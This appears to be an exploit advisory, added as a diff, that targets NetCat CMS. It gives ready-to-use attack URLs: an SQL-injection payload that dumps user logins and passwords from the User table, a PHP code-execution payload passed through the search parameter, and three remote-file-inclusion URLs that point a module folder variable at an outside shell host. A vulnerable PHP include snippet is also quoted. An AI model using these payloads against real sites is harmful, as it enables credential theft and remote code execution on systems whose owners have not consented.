@@ -1,0 +1,42 @@
+# Exploit Title: NetCat CMS Code exec, SQL-injection
+# Google Dork: none
+# Date: 28.11.2010
+# Author: brain[pillow]
+# Software Link: http://netcat.ru/
+# Version: UNKNOWN
+
+On different versions of this software next vulnerabilities are availible:
+
+=======================================================
+# Sql-injection:
+
+/search/?action=index&text=q')+union+select+1,1,concat_ws(0x3a,login,password),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1+from+User%23
+
+=======================================================
+# Code exec:
+
+/search/?action=index&text={${phpinfo()}}
+
+# Remote File Inclusion:
+=================================
+# Vuln code example:
+=================================
+
+<?php
+/* $Id: function.inc.php 3272 2009-05-25 14:34:42Z vadim $ */
+
+// get global value (for admin mode)
+global $MODULE_FOLDER;
+
+// include need classes
+include_once ($MODULE_FOLDER."filemanager/nc_filemanager.class.php");
+
+?>
+
+================================
+# Three exploits:
+================================
+
+/netcat/modules/filemanager/function.inc.php?MODULE_FOLDER=http://shell?
+/netcat/modules/forum2/function.inc.php?MODULE_FOLDER=http://shell?
+/netcat/modules/logging/function.inc.php?MODULE_FOLDER=http://shell?
